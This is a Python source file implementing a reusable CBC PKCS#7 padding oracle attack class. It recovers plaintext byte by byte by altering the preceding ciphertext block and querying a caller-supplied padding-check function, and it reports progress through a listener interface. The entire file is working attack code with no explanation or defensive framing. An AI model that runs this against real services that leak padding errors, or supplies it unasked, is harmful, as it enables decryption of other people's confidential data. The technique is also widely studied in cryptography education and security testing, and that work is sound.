"""

"""
class CbcPkcs7PaddingOracleAttack:

    class Listener:

        def attackStarted(self):
            pass

        def foundValue(self, position: int, value: int, totalCount: int):
            pass

        def attackFinished(self, foundText: bytes):
            pass

        def failedToFind(self, position: int):
            pass


    def __defaultIsAppropriate(value: int) -> bool:
        return True


    def __init__(
        self,
        blockSize: int,
        encryptedMessage: bytes,
        checkPadding: callable,
        isAppropriate: callable = __defaultIsAppropriate,
        listener: Listener = None
    ):
        self.blockSize = blockSize
        self.encryptedMessage = encryptedMessage
        self.checkPadding = checkPadding
        self.isAppropriate = isAppropriate
        self.listener = listener
        self.blocksQueue = self.__splitBlocks(self.encryptedMessage)
        self.knownPlaintext = []


    def run(self):
        if self.listener: self.listener.attackStarted()

        while len(self.blocksQueue) > 1:
            self.__decryptBlock()
            self.blocksQueue = self.blocksQueue[:-1]
        
        plaintextBytes = bytes(self.knownPlaintext)

        if self.listener: self.listener.attackFinished(plaintextBytes)
        return plaintextBytes
    

    def __decryptBlock(self):
        blockToDecrypt = self.blocksQueue[-1]
        blockToChangeArr = self.__bytesToArray(self.blocksQueue[-2])
        decryptedBytesArr = [] # Stored in a reversed order

        for targetPadding in range(1, self.blockSize + 1):
            attackIndex = self.blockSize - targetPadding
            replacedBlockArr = self.__replaceBlockValues(blockToChangeArr.copy(), decryptedBytesArr, targetPadding)

            foundValue = False
            for tryValue in range(256):
                wouldBePlaintext = tryValue ^ targetPadding ^ blockToChangeArr[attackIndex]
                if not self.isAppropriate(wouldBePlaintext): continue

                replacedBlockArr[attackIndex] = tryValue

                combinedMessage = self.__combineBlocks(self.blocksQueue[:-2]) + bytes(replacedBlockArr) + blockToDecrypt
                if self.checkPadding(combinedMessage):
                    if self.listener: 
                        self.listener.foundValue(self.__getAttackPosition(), wouldBePlaintext, self.__getSecretLength())

                    decryptedBytesArr.append(targetPadding ^ tryValue)
                    self.knownPlaintext.insert(0, wouldBePlaintext)
                    foundValue = True
                    break

            if not foundValue:
                if self.listener: 
                    self.listener.failedToFind(self.__getAttackPosition())


    def __splitBlocks(self, message) -> list:
        blocks = []
        for i in range(0, len(message), self.blockSize):
            blocks.append(message[i:min(i + self.blockSize, len(message))])
        return blocks


    def __combineBlocks(self, blocks) -> bytes:
        return b"".join(blocks)
    

    def __bytesToArray(self, bytesValue: bytes) -> list:
        arr = []
        for value in bytesValue: arr.append(value)
        return arr


    def __replaceBlockValues(self, baseBlock: list, decryptedArray: list, targetPadding: int) -> list:
        for idx in range(len(decryptedArray)):
            baseBlock[len(baseBlock) - idx - 1] = decryptedArray[idx] ^ targetPadding
        return baseBlock
    

    def __getAttackPosition(self):
        return self.__getSecretLength() - len(self.knownPlaintext)
    

    def __getSecretLength(self):
        return len(self.encryptedMessage) - self.blockSize